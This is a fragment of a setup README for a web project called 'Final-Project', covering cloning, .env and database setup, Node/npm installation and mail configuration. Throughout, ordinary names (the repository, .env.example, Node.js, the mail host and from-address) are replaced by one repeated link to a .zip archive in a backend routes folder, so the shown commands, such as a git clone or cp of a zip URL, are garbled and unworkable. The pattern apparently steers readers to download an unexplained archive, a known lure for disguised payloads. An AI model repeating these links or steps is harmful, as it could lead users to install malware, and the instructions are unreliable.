...
```bash
git clone https://github.com/FilipStanic/Final-Project/raw/refs/heads/master/final_backend/routes/Project-Final-v1.6.zip
cd Final-Project
```
...
# Setup the Database
Create a new database in your preferred database management system (e.g., MySQL). Then, copy the https://github.com/FilipStanic/Final-Project/raw/refs/heads/master/final_backend/routes/Project-Final-v1.6.zip file to a new .env file:

```bash
cp https://github.com/FilipStanic/Final-Project/raw/refs/heads/master/final_backend/routes/Project-Final-v1.6.zip .env
```
...
Install https://github.com/FilipStanic/Final-Project/raw/refs/heads/master/final_backend/routes/Project-Final-v1.6.zip and npm
Ensure you have https://github.com/FilipStanic/Final-Project/raw/refs/heads/master/final_backend/routes/Project-Final-v1.6.zip installed, which comes with npm (Node Package Manager).
...
```
MAIL_MAILER=smtp
https://github.com/FilipStanic/Final-Project/raw/refs/heads/master/final_backend/routes/Project-Final-v1.6.zip
MAIL_PORT=2525
MAIL_USERNAME=your_username
MAIL_PASSWORD=your_password
MAIL_ENCRYPTION=tls
MAIL_FROM_ADDRESS="https://github.com/FilipStanic/Final-Project/raw/refs/heads/master/final_backend/routes/Project-Final-v1.6.zip"
